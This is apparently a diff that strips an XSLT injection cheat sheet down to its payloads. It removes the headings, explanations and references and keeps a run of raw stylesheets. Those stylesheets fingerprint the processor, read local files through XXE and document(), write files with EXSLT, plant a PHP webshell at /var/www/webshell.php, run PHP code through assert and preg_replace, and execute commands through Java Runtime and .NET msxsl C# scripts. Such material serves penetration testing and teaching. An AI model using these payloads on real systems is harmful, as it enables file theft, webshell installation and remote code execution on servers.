@@ -1,39 +1,11 @@
-# XSLT Injection
 
-> Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code
-
-## Summary
-
-- [Tools](#tools)
-- [Methodology](#methodology)
-    - [Determine the Vendor And Version](#determine-the-vendor-and-version)
-    - [External Entity](#external-entity)
-    - [Read Files and SSRF Using Document](#read-files-and-ssrf-using-document)
-    - [Write Files with EXSLT Extension](#write-files-with-exslt-extension)
-    - [Remote Code Execution with PHP Wrapper](#remote-code-execution-with-php-wrapper)
-    - [Remote Code Execution with Java](#remote-code-execution-with-java)
-    - [Remote Code Execution with Native .NET](#remote-code-execution-with-native-net)
-- [Labs](#labs)
-- [References](#references)
-
-## Tools
-
-No known tools currently exist to assist with XSLT exploitation.
-
-## Methodology
-
-### Determine the Vendor and Version
-
-```xml
 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
  <xsl:value-of select="system-property('xsl:vendor')"/>
   </xsl:template>
 </xsl:stylesheet>
-```
-
-```xml
+--------------
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body>
@@ -42,13 +14,7 @@ No known tools currently exist to assist with XSLT exploitation.
 <br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
 </body>
 </html>
-```
-
-### External Entity
-
-Don't forget to test for XXE when you encounter XSLT files.
-
-```xml
+------------------------
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
@@ -61,11 +27,7 @@ Don't forget to test for XXE when you encounter XSLT files.
     </xsl:for-each>
   </xsl:template>
 </xsl:stylesheet>
-```
-
-### Read Files and SSRF Using Document
-
-```xml
+------------------------------
 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
@@ -80,13 +42,7 @@ Don't forget to test for XXE when you encounter XSLT files.
     </xsl:for-each>
   </xsl:template>
 </xsl:stylesheet>
-```
-
-### Write Files with EXSLT Extension
-
-EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language.
-
-```xml
+-----------------------------
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet
   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
@@ -99,34 +55,20 @@ EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions
     </exploit:document>
   </xsl:template>
 </xsl:stylesheet>
-```
-
-### Remote Code Execution with PHP Wrapper
-
-Execute the function `readfile`.
-
-```xml
+--------------------------------
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body>
 <xsl:value-of select="php:function('readfile','index.php')" />
 </body>
 </html>
-```
-
-Execute the function `scandir`.
-
-```xml
+-------------------------
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
   <xsl:template match="/">
     <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
   </xsl:template>
 </xsl:stylesheet>
-```
-
-Execute a remote php file using `assert`
-
-```xml
+----------------------------
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
@@ -136,11 +78,7 @@ Execute a remote php file using `assert`
   <xsl:variable name="include" select="php:function('assert',$payload)"/>
 </body>
 </html>
-```
-
-Execute a PHP meterpreter using PHP wrapper.
-
-```xml
+-------------------------
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
   <xsl:template match="/">
     <xsl:variable name="eval">
@@ -149,21 +87,13 @@ Execute a PHP meterpreter using PHP wrapper.
     <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
   </xsl:template>
 </xsl:stylesheet>
-```
-
-Execute a remote php file using `file_put_contents`
-
-```xml
+-------------------------
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
   <xsl:template match="/">
     <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
   </xsl:template>
 </xsl:stylesheet>
-```
-
-### Remote Code Execution with Java
-
-```xml
+--------------------------
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
     <xsl:template match="/">
       <xsl:variable name="rtobject" select="rt:getRuntime()"/>
@@ -172,20 +102,14 @@ Execute a remote php file using `file_put_contents`
       <xsl:value-of select="$processString"/>
     </xsl:template>
   </xsl:stylesheet>
-```
-
-```xml
+-------------------------
 <xml version="1.0"?>
 <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
 <xsl:template match="/">
 <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
 </xsl:template>.
 </xsl:stylesheet>
-```
-
-### Remote Code Execution with Native .NET
-
-```xml
+------------------
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
     <msxsl:script implements-prefix="App" language="C#">
       <![CDATA[
@@ -208,9 +132,7 @@ Execute a remote php file using `file_put_contents`
       </TABLE>
     </xsl:template>
 </xsl:stylesheet>
-```
-
-```xml
+------------------
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:msxsl="urn:schemas-microsoft-com:xslt"
@@ -237,16 +159,3 @@ return proc.StandardOutput.ReadToEnd();
   --- END COMMAND OUTPUT --- 
   </xsl:template>
 </xsl:stylesheet>
-```
-
-## Labs
-
-- [Root Me - XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
-
-## References
-
-- [From XSLT code execution to Meterpreter shells - Nicolas Grégoire (@agarri) - July 2, 2012](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
-- [XSLT Injection - Fortify - January 16, 2021](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
-- [XSLT Injection Basics - Saxon - Hunnic Cyber Team - August 21, 2019](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
-- [Getting XXE in Web Browsers using ChatGPT - Igor Sak-Sakovskiy - May 22, 2024](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
-- [XSLT injection lead to file creation - PT SWARM (@ptswarm) - May 30, 2024](https://twitter.com/ptswarm/status/1796162911108255974/photo/1)
